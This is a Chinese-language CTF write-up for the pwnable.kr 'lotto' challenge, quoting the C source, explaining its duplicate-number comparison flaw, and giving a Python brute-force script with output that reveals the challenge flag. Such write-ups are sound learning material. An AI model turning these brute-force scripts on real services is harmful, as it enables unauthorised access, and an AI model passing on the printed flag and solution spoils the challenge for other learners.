---
title: pwnablr.kr-lotto
date: 2018-01-26 17:47:00
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
## 前言
又是一道很简单的源码阅读题目，考察思路。
## 分析
还是先分析源码
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){
	
	int i;
	printf("Submit your 6 lotto bytes : ");
	fflush(stdout);

	int r;
	r = read(0, submit, 6);

	printf("Lotto Start!\n");
	//sleep(1);

	// generate lotto numbers
	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1){
		printf("error. tell admin\n");
		exit(-1);
	}
	unsigned char lotto[6];
	if(read(fd, lotto, 6) != 6){
		printf("error2. tell admin\n");
		exit(-1);
	}
	for(i=0; i<6; i++){
		lotto[i] = (lotto[i] % 45) + 1;		// 1 ~ 45
	}
	close(fd);
	
	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}

	// win!
	if(match == 6){
		system("/bin/cat flag");
	}
	else{
		printf("bad luck...\n");
	}

}

void help(){
	printf("- nLotto Rule -\n");
	printf("nlotto is consisted with 6 random natural numbers less than 46\n");
	printf("your goal is to match lotto numbers as many as you can\n");
	printf("if you win lottery for *1st place*, you will get reward\n");
	printf("for more details, follow the link below\n");
	printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
	printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

	// menu
	unsigned int menu;

	while(1){

		printf("- Select Menu -\n");
		printf("1. Play Lotto\n");
		printf("2. Help\n");
		printf("3. Exit\n");

		scanf("%d", &menu);

		switch(menu){
			case 1:
				play();
				break;
			case 2:
				help();
				break;
			case 3:
				printf("bye\n");
				return 0;
			default:
				printf("invalid menu\n");
				break;
		}
	}
	return 0;
}

```
分析游戏的主逻辑，大致就是从标准输入读取6个字节，然后程序通过读取`/dev/urandom`（这是一个linux下的伪随机设备）并进行一些运算生成了6个在1到45之间的随机数。最后随机数的每一个字节都与提交的6个字节进行比较，相等match就加1，如果最终match等于6就getflag。
漏洞还是很容易看出来的，如果提交的6个字节相等并且在1到45之间，那么就有6/45的概率getflag。这个概率还是很大的。可以手动，可以自动。下面贴出自动的代码（记得上传到/tmp目录下）
```python
# coding=utf-8

import subprocess as sp
import time
import threading

text = 'bad luck...\n'
def work(s):
    global text
    while True:
        t = s.stdout.readline()
        if not t:
            break
        text += t
    
    

def main():
    global text
    num = 0
    s = sp.Popen('/home/lotto/lotto',stdin=sp.PIPE,stdout=sp.PIPE,cwd='/home/lotto/')
    th = threading.Thread(target=work,args=(s,))
    th.start()
    last = ''
    while True:
        s.stdin.write('1\n')
        time.sleep(0.1)
        s.stdin.write(' '*6)
        time.sleep(0.1)
        num += 1
        
        #print text

        if 'bad luck...' not in text:
            print 'you try {} times!\n'.format(num-1)
            print last
            break
        last = text
        text = ''
    
    s.kill()
    
main()
```
结果
```bash
lotto@ubuntu:/tmp$ python 1.py
you try 19 times!

Submit your 6 lotto bytes : Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
Submit your 6 lotto bytes : sorry mom... I FORGOT to check duplicate numbers... :(

lotto@ubuntu:/tmp$ 

```
## 总结
思路很简单，写代码的时候遇到了一点小问题，主要是需要熟练python的subprocess模块的使用。但其实我首先手动的试了一下，一遍就过了，哈哈。人品爆发，不写了，买彩票去了。